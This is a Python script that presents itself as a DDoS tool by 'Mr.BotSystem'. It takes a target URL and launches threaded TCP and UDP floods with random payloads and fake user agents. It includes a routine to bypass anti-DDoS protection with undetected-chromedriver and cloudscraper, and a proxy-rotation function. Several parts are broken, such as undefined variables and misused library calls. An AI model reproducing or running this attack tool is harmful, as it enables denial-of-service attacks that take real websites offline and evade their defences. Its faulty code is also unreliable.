import sys
import socket
import threading
import time
import os
import random
import urllib.parse # To parse the url and get the host and port
import requests
from threading import Thread # To use threading
import queue # To use queue
import string # To generate random payload
import undetected_chromedriver as uc # To use undetected-chromedriver
from fake_useragent import UserAgent
import cloudscraper

print(sys.version)
print()
print("THIS DDOS TOOL CREATED BY Mr.BotSystem")
print()
# Define the target URL
url = input("Enter the target URL: ") # Change this to the target URL

# Parse the url and get the host and port
parsed_url = urllib.parse.urlparse(url)
host = parsed_url.hostname
port = parsed_url.port

# Define the number of threads to use
Threads = int(input("Enter the number of threads: ")) # Change this to the number of threads

# Define the protocol to use (TCP or UDP)
protocol = input("Enter the protocol (TCP or UDP): ") # Change this to the protocol

# Define a function to check if the website is online
def check_website(url):
    """
    Sends a GET request to the given URL and returns True if the status code is 200, False otherwise.

    Parameters:
    url (str): The URL of the website to check.
        
        Returns:
    bool: True if the website is online, False otherwise.
    """
    # Try to send a request to the website and get the status code
    try:
        response = requests.get(url)
        status_code = response.status_code

        # If the response status code is 200, return True
        if response.status_code == requests.codes.ok:
            return True
            
            # Otherwise, return False
        else:
            return False

    # If an exception occurs, return False
    except requests.exceptions.RequestException:
        return False
        
# Define a function to bypass anti-DDoS protection using undetected-chromedriver and cloudscraper
def bypass_anti_ddos(url):
    """
    Opens the given URL in a headless Chrome browser using undetected-chromedriver and cloudscraper and returns the cookies as a dictionary.
    
    Parameters:
    url (str): The URL of the website to bypass.

    Returns:
    dict: A dictionary of cookies with names as keys and values as values.
    """
    # Create an options object for Chrome browser
    options = uc.ChromeOptions()
    
    # Add arguments for headless mode and window size
    options.add_argument("--headless")
    options.add_argument("--window-size=1920x1080")

    # Create an undetected-chromedriver object with options using a context manager
    with uc.Chrome(options=options) as driver:
        
        # Get target URL using driver
        driver.get(url)

        # Wait for page load
        driver.execute_script("return document.readyState") == "complete"

        # Get cookies from driver
        cookies = driver.get_cookies() # This line should be indented to match the rest of the code
        
        # Convert cookies into requests format
        requests_cookies = {} # You need to initialize an empty dictionary to store the cookies

        for cookie in cookies: # You need to iterate over the list of cookies returned by the driver
    
            requests_cookies[cookie["name"]] = cookie["value"] # You need to assign the cookie name and value as key-value pairs in the dictionary
            
            # Create a cloudscraper session object with requests_cookies
        scraper = cloudscraper.create_scraper(cookies=requests_cookies)

        # Make a GET request using the scraper object to the same URL
        response = scraper.get(url)

        # Print the response status code and content
        print(response.status_code)
        print(response.content)
        
        # Return the requests_cookies dictionary
        return requests_cookies

# Define a list of fake user agents
ua = UserAgent()
ua.ie
# Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);
ua.msie
# Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)'
ua['Internet Explorer']
# Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)
ua.opera
# Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11
ua.chrome
# Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2'
ua.google
# Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13
ua['google chrome']
# Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
ua.firefox
# Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1
ua.ff
# Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1
ua.safari
# Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25

# and the best one, get a random browser user-agent string
ua.random

# Define a function to use proxies
def use_proxies():

    # Define a list of proxy URLs
    proxy_urls = ["https://api.proxyscrape.com/v2/?request=displayproxies", "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxies.txt", "https://www.proxy-list.download/api/v1/get?type=http"]
    
    # Define a list of URLs to request
    request_urls = ["https://www.bing.com", "https://www.google.com", "https://www.yahoo.com"]

    # Loop through the proxy URLs and the request URLs
    for proxy_url, request_url in zip(proxy_urls, request_urls):
        
        # Create a proxy dictionary
        proxies = {
            "http": proxy_url,
            "https": proxy_url,
        }

        # Make a request using the proxies
        response = requests.get(request_url, proxies=proxies)

        # Print the status code and the content
        print(response.status_code)
        print(response.content)
        
# Define a function to generate a random payload
def generate_payload():

    # Choose a random length between 100 and 1000
    length = random.randint(100, 1000)

    # Choose a random string of alphanumeric characters
    payload = "".join(random.choices(string.ascii_letters + string.digits, k=length))

    # Return the payload
    return payload

# Define a function to perform the attack on the website using TCP
def tcp_flood():

    # Create a TCP socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try to connect to the host and port
    try:
        s.connect((host, port))

        # Choose a random user agent from the list
        ua = random.choice(UserAgent)
        
        # Generate a random payload
        payload = generate_payload()

        # Construct a HTTP request with the user agent and payload
        # Use f-strings instead of format for readability and performance
        request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
        
        # Make a request using the proxies
        response = requests.get(request, proxies=proxies)

        # Encode the request as bytes
        request_bytes = request.encode()

        # Send the request to the socket
        s.send(request_bytes)
        
        # Print a message indicating success
        # Use f-strings instead of format for readability and performance
        print(f"Sent {len(request_bytes)} bytes to {host}:{port} using TCP")

        # Close the socket
        s.close()

    # If an exception occurs, print an error message
    except Exception as e:
        # Use parentheses for print function in Python 3
        print(f'Error: {e}')
        s.close()
# Define a function to perform the attack on the website using UDP
def udp_flood():

    # Create a UDP socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Try to send data to the host and port
    try:

        # Choose a random user agent from the list
        ua = random.choice(UserAgent)

        # Generate a random payload
        payload = generate_payload()
        
        # Create a HTTP request with the user agent and payload
        # Use f-strings instead of format for readability and performance
        request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
        
        # Make a request using the proxies
        response = requests.get(request, proxies=proxies)

        # Encode the request as bytes
        payload_bytes = payload.encode()

        # Send the payload bytes to the host and port
        s.sendto(payload_bytes, (host, port))
        
        # Print a message indicating success
        # Use f-strings instead of format for readability and performance
        print(f"Sent {len(payload_bytes)} bytes to {host}:{port} using UDP")

        # Close the socket
        s.close()

    # If an exception occurs, print an error message
    except Exception as e:
        # Use parentheses for print function in Python 3
        print(f'Error: {e}')

# Define a function to run multiple threads of the attack function
def run_Threads():

    # Create a queue object to store the tasks
    task_queue = queue.Queue()

    # For each thread, create a thread object with the attack function as target and task queue as argument
    for i in range(Threads):
        
        if protocol == "TCP":
            thread = threading.Thread(target=tcp_flood, args=(task_queue,))

        elif protocol == "UDP":
            thread = threading.Thread(target=udp_flood, args=(task_queue,))

        else:
            print("Invalid protocol.")
            return

        # Append the thread object to the list
        
        thread_list.append(thread)

        # Start the thread
        thread.start()

    # While the queue is not empty, get a task from it and put it back to keep it alive
    while not task_queue.empty():
        task = task_queue.get()
        task_queue.put(task)
        
        # For each thread in the list, join it to wait for completion
    for thread in thread_list:
        thread.join()

# Create a loop to launch threads for sending requests
for i in range(Threads):
    # Create and start a thread object with the attack function as the target
    threading.Thread(target=tcp_flood).start()

# Create a loop to launch threads for sending requests
for i in range(Threads):
    # Create and start a thread object with the attack function as the target
    
    threading.Thread(target=udp_flood).start()